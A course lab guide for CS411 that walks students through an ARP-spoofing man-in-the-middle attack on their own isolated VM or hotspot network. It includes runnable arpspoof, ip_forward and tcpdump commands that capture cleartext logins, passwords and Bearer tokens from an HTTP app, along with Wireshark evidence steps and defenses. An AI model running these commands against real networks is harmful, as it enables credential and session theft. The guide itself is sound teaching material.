# MITM lab — ARP spoofing on intnet

CS411 deliverable: add an attacker VM, intercept the Client↔Server HTTP traffic
with ARP spoofing, prove it in Wireshark, and answer the three questions.

**Scope:** our own isolated lab network (`intnet`), our own VMs, for a graded
class exercise. Nothing leaves the host PC.

## Why it works

Machines on a LAN reach each other by **MAC address**. ARP maps IP → MAC, and a
host trusts any ARP reply with no authentication. The attacker sends forged
replies so the Client thinks the attacker's MAC owns the Server's IP (and vice
versa). Both sides then send frames to the attacker, who forwards them on — a
man in the middle. Because HMS runs over **HTTP**, the attacker reads
everything in clear.

## Two ways to run it

**Option A — intnet (3 VMs on one PC).** Isolated, reliable, no outside network.
**Option B — hotspot (3 physical laptops).** Matches our current setup; the
lab allows physical machines. Use this if that's how you're presenting.

The attack is identical; only the addresses and the capture method differ.

### Topology A — intnet

| VM | Adapter | IP |
|----|---------|-----|
| LabServer | intnet | 192.168.100.10 |
| Client | intnet | 192.168.100.x (DHCP) |
| **Attacker** (new, e.g. Kali/Ubuntu) | intnet | 192.168.100.y (DHCP) |

Put LabServer back on `intnet` with its static IP first
(see hotspot-demo-and-wireshark.md §7). Attacker VM: one adapter, Internal
Network `intnet`, nothing else.

### Topology B — hotspot (3 laptops)

| Computer | Role | IP (example) |
|----------|------|--------------|
| Laptop 1 | Server (LabServer VM, **bridged** to Wi-Fi) | 172.20.10.10 |
| Laptop 2 | Client (browser) | 172.20.10.9 |
| Laptop 3 | Attacker (Kali, or Ubuntu + `dsniff`) | 172.20.10.z |

Attacker can run Linux natively (simplest) or as a VM **bridged** to the Wi-Fi
card. Find every IP with `ip -br addr` (Linux) / `ipconfig` (Windows).

**Critical pre-check — client isolation.** Many hotspots block
device-to-device traffic. From the attacker, both must reply:

```bash
ping -c2 172.20.10.10        # the server
ping -c2 172.20.10.9         # the client
```

If a ping fails, the hotspot has AP isolation on — the attack (and the whole
demo) can't work on it. Use another network or Topology A.

**Capture on the hotspot:** no VBoxManage. Each machine runs **Wireshark
directly on its own Wi-Fi adapter**. Capturing *on the attacker* is the best
evidence: after poisoning you see Client↔Server HTTP that was never addressed
to the attacker's IP. Skip the `nictrace` commands below and use Wireshark's
normal interface capture instead; everything else (arpspoof, filters,
questions) is the same. Replace 192.168.100.* with your hotspot IPs throughout.

## Deliverable 01 — add the Attacker VM

New VM, Adapter 1 = Internal Network `intnet`. Boot, then:

```bash
ip -br addr                 # note the 192.168.100.y address
sudo apt update && sudo apt install -y dsniff   # provides arpspoof (if not preinstalled)
```

Record every machine's IP and MAC now, for the "before" evidence:

```bash
ip -br link                 # my own MAC
ping -c1 192.168.100.10; ping -c1 192.168.100.<client>
ip neigh                    # the real IP↔MAC table
```

## Deliverable 03a — capture NORMAL traffic first ("before")

The lab wants evidence of normal communication *and* the attack. Capture the
normal case before touching anything. On the **host** (PowerShell), record the
server adapter (intnet = NIC 2 on all our VMs):

```powershell
$env:Path += ";C:\Program Files\Oracle\VirtualBox"
VBoxManage controlvm "LabServer" nictracefile2 "C:\captures\mitm-before.pcap"
VBoxManage controlvm "LabServer" nictrace2 on
```

On the **Client**, open http://192.168.100.10 and log in. Stop the trace:

```powershell
VBoxManage controlvm "LabServer" nictrace2 off
```

In Wireshark: `arp` shows each side asking for the real MAC; `http` shows the
login going straight Client→Server. This is the "before" picture (slide 3 top).

## Deliverable 02 — run the attack

On the **Attacker VM**.

**1. Turn on forwarding** so traffic you intercept still reaches its
destination (otherwise you cut the connection instead of relaying it):

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

**2. Poison both directions** (two terminals, leave both running):

```bash
# tell the Client that the Server's IP is at the attacker's MAC
sudo arpspoof -i <iface> -t 192.168.100.<client> 192.168.100.10
```
```bash
# tell the Server that the Client's IP is at the attacker's MAC
sudo arpspoof -i <iface> -t 192.168.100.10 192.168.100.<client>
```

`<iface>` is the attacker's intnet card (from `ip -br addr`, e.g. `enp0s3`).

**3. Watch the traffic go through the attacker.** In a third terminal, capture
on the attacker itself and read the HTTP:

```bash
sudo tcpdump -i <iface> -w /tmp/mitm-attack.pcap 'tcp port 80' &
# or watch logins live:
sudo tcpdump -i <iface> -A -s0 'tcp port 80 and host 192.168.100.10'
```

**4. On the Client, log in again** at http://192.168.100.10. In the attacker's
`tcpdump -A` window you will see the POST /api/auth/login with the email and
**password in clear text**, and the `Authorization: Bearer` token on later
requests.

**Stop cleanly:** Ctrl+C both `arpspoof` windows — it automatically sends
correct ARP replies to repair the caches. If you killed them abruptly, on the
Client run `sudo ip neigh flush all` or just wait.

## Deliverable 03b — the "during" capture

Two good evidence sources:

- `/tmp/mitm-attack.pcap` on the attacker (copy it to the host with `scp` or a
  shared folder).
- A host-side `nictrace` of the **Client** adapter during the attack
  (`mitm-during.pcap`): it shows the Client's frames now going to the
  attacker's MAC.

Filters to screenshot:

| Filter | What it proves |
|---|---|
| `arp` | the forged "gratuitous" ARP replies from the attacker's MAC claiming .10 and the client IP |
| `arp.duplicate-address-detected` or Wireshark's expert info | Wireshark flags the MAC/IP conflict — direct evidence of spoofing |
| `http.request.method == "POST"` → Follow HTTP Stream | the login with password in clear, captured *by the attacker* |
| `eth.addr == <attacker MAC>` | Client↔Server traffic now carrying the attacker's MAC in the middle |

Compare `mitm-before.pcap` (frames use the **real** server MAC) with the attack
capture (same IPs, but the **attacker's** MAC) — that side-by-side is the
strongest slide.

## Deliverable 04 — the three questions

**A. How did the attacker get in the middle?**
ARP has no authentication. The attacker broadcast forged ARP replies binding
the server's IP (192.168.100.10) to the attacker's MAC, and the client's IP to
the attacker's MAC. Both victims updated their ARP caches and began sending
frames to the attacker, who forwarded them with `ip_forward=1` so the session
kept working. No password or access to the server was needed — only being on
the same LAN.

**B. What could the attacker observe?**
Everything, because HMS uses HTTP, not HTTPS: the full URLs, the login
**email and password in clear text**, the JWT in the `Authorization: Bearer`
header (which the attacker could replay to impersonate the user), and all
appointment / medical / billing data in the JSON responses.

**C. What changed vs. normal communication?**
Normally the client's frames carry the **server's real MAC** and go straight to
it. Under the attack, the same IP packets are wrapped in Ethernet frames
addressed to the **attacker's MAC**; the path is Client → Attacker → Server
instead of Client → Server. Wireshark shows two different MACs claiming one IP,
and the ARP table on the client now points the server's IP at the attacker.

## The defense (good closing slide)

- **HTTPS/TLS**: the attacker would still relay bytes but couldn't read or alter
  them, and the certificate check would warn the user. This is the real-world
  fix and ties back to our HTTP scenarios.
- Static ARP entries, dynamic ARP inspection on managed switches, and tools
  that alert on a MAC suddenly owning the gateway IP.

## Troubleshooting

| Problem | Fix |
|---|---|
| Client loses internet/connection during attack | `ip_forward` not set to 1, or only one direction poisoned |
| `arpspoof: command not found` | `sudo apt install dsniff` |
| No HTTP in the attacker capture | poisoning not effective — confirm with `ip neigh` on the Client that .10 now shows the attacker's MAC |
| Client still shows the real MAC | wrong interface, or the Client cached a static entry; `sudo ip neigh flush all` on the Client and retry |
| Caches stay broken after the demo | let `arpspoof` exit with Ctrl+C (it restores them) |
